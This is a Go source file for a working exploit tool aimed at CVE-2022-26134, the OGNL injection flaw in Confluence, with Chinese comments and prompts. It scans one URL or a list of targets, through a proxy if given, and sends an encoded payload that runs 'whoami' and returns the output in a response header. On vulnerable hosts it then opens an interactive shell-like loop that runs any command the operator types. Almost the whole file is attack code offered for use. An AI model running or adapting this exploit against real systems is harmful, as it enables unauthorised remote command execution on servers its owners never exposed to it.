package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

var target string
var targets []string
var listUrl string
var proxy string
var transport = &http.Transport{}

func Init() {
	flag.StringVar(&proxy, "proxy", "", "代理")
	flag.StringVar(&target, "url", "", "目标")
	flag.StringVar(&listUrl, "list", "", "目标列表")
}
func Banner() {
	fmt.Println(`
           __.__  .__       _______   
__  _  __ |__|  | |__| ____ \   _  \  
\ \/ \/ / |  |  | |  |/    \/  /_\  \ 
 \     /  |  |  |_|  |   |  \  \_/   \
  \/\_/\__|  |____/__|___|  /\_____  /
      \______|            \/       \/ 
        CVE-2022-26134`)
}

func urlHandler(target string) string {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}
	// 有/结尾的就去掉/
	if strings.HasSuffix(target, "/") { // 去掉后缀 /
		target = strings.TrimSuffix(target, "/")
		//fmt.Println(target)
	}

	return target
}

func checkProxy() {
	if proxy != "" {
		url_i := url.URL{}
		urlProxy, error := url_i.Parse(proxy)
		if error != nil {
			fmt.Println(error.Error())
			return
		}
		transport = &http.Transport{Proxy: http.ProxyURL(urlProxy)}
		fmt.Println("设置代理: ", proxy, " 成功")
	}
}

func checkArgs() {

	if target != "" {
		targets = append(targets, urlHandler(target))
	}
	if listUrl != "" {
		fmt.Println("正在打开文件")
		filePath := listUrl
		file, err := os.Open(filePath)
		if err != nil {
			fmt.Println("文件打开失败", err)
		}
		defer file.Close()
		//读原来文件的内容，并且显示在终端
		reader := bufio.NewReader(file)
		for {
			target, err := reader.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					if target != "" {
						targets = append(targets, urlHandler(target))
					}
					break
				}
			}
			//fmt.Printf("%#v\n", target)
			target = strings.TrimSpace(target)
			//fmt.Printf("%#v\n", target)
			targets = append(targets, urlHandler(target))
		}
		fmt.Println(targets)
	}
	if targets == nil {
		//flag.Usage()
		os.Exit(0)
	}
}
func check(t string) (b bool) {
	b = false
	vulurl := t + "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
	req, er := http.NewRequest("GET", vulurl, bytes.NewReader([]byte{}))
	if er != nil {
		fmt.Println(er)
		fmt.Println("请求失败")
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	client := http.Client{Transport: transport, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
	resp, er := client.Do(req)
	if er != nil {
		return
	}
	status := resp.StatusCode
	_, ok := resp.Header["X-Cmd-Response"]
	if ok && status == 302 {
		b = true
		fmt.Println("目标：", t, "存在漏洞")
	} else {
		b = false
		fmt.Println("目标：", t, "不存在漏洞")

	}
	return

}
func exp(t string, comm string) {
	vulurl := t + `/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22` + comm + `%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/`
	req, er := http.NewRequest("GET", vulurl, bytes.NewReader([]byte{}))
	if er != nil {
		fmt.Println(er)
		fmt.Println("请求失败")
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	client := http.Client{Transport: transport, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
	resp, _ := client.Do(req)
	_, ok := resp.Header["X-Cmd-Response"]
	if ok && resp.StatusCode == 302 {
		res := resp.Header.Get("X-Cmd-Response")
		fmt.Print("\n执行结果：\n")
		fmt.Println(res)
	} else {
		fmt.Println("\n未存在漏洞\n")
	}

}
func main() {
	Banner()
	Init()
	flag.Parse()
	checkArgs()
	checkProxy()
	var successTargets []string
	for _, t := range targets {
		b := check(t)
		if b {
			successTargets = append(successTargets, t)
		}
	}
	if successTargets != nil {
		for {
			fmt.Print("\n是否进入攻击模式，请输入无视风险,继续：")
			reader := bufio.NewReader(os.Stdin)
			com, _, _ := reader.ReadLine()
			if string(com) == "无视风险,继续" {
				break
			}
		}

	}
	if successTargets != nil {
		var i int
		var t string
		var comm string
		fmt.Println("选择目标：")
		for i, tar := range successTargets {
			fmt.Println("目标：", tar, " , ", i)
		}
		if len(successTargets) == 1 {
			t = successTargets[0]
		} else {
			_, err := fmt.Scanln(&i)
			if err != nil {
				t = successTargets[0]
			}
		}

		t = successTargets[i]
		for {
			fmt.Print("\n输入命令：")
			reader := bufio.NewReader(os.Stdin)
			com, _, _ := reader.ReadLine()
			if string(com) == "" {
				break
			}
			comm = strings.Replace(string(com), " ", "%20", -1)
			exp(t, comm)
		}
	} else {
		fmt.Println("没有目标存在漏洞")
	}

}
